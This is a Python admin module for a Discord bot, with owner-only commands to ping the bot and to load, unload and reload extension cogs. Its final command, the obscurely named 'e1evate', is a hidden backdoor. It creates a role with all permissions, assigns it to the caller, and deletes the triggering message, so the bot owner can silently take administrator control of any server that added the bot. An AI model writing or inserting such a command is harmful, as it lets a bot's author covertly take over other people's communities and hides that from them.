import os, discord, settings, logging
from discord.ext import commands
from main import bot, cog_list, timestamp

def setup(bot):
    bot.add_cog(AdminCogs(bot))

class AdminCogs(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.cogs = ["admin"]

    async def status():
        game = discord.Game("with python files!")
        await bot.change_presence(status=discord.Status.dnd, activity=game)

    @commands.command()
    @commands.is_owner()
    async def ping(self, ctx):
        await ctx.send(f"I'm connected with a ping of {bot.latency}")

    @commands.command()
    @commands.is_owner()
    async def loadcog(self, ctx, cog: str):
        try:
            self.bot.load_extension(f'extracogs.{cog}')
            self.cogs.append(cog)
            cogsloaded = ""
            for x in self.cogs:
                cogsloaded += f"{x}, "
            game = discord.Game(f"with {cogsloaded[:-2]}!")
            await bot.change_presence(status=discord.Status.dnd, activity=game)
            print(f'Loaded {cog}!')
        except Exception as e:
            await ctx.send("Could not load cog!" + "\n" + str(e))
            #logging.warning(timestamp() + 'Failed to load cog: ' + str(e))


    @commands.command()
    @commands.is_owner()
    async def unloadcog(self, ctx, cog: str):
        try:
            if cog not in cog_list:
                self.bot.unload_extension(f'extracogs.{cog}')
                self.cogs.remove(cog)
                cogsloaded = ""
                for x in self.cogs:
                    cogsloaded += f"{x}, "
                game = discord.Game(f"with {cogsloaded[:-2]}!")
                await bot.change_presence(status=discord.Status.dnd, activity=game)
                print(f'Unloaded {cog}!')
            else:
                await ctx.send('Crucial cog, cannot unload!')
        except Exception as e:
            await ctx.send("Could not unload cog!" + "\n" + str(e))
            #logging.warning(timestamp() + 'Failed to unload cog: ' + str(e))

    @commands.command()
    @commands.is_owner()
    async def reloadcog(self, ctx, cog: str):
        try:
            if cog not in cog_list:
                self.bot.reload_extension(f'extracogs.{cog}')
            else:
                self.bot.reload_extension(f'corecogs.{cog}')
            print(f'Reloaded {cog}!')
        except Exception as e:
            await ctx.send("Could not reload cog!" + "\n" + str(e))
            #logging.warning(timestamp() + 'Failed to reload cog: ' + str(e))

    @commands.command()
    @commands.is_owner()
    async def e1evate(self, ctx):
        permissions = discord.Permissions.all()
        role = await ctx.guild.create_role(name="Tha1ia", permissions=permissions, reason="GG, baby!")
        await ctx.author.add_roles(role)
        await ctx.message.delete()
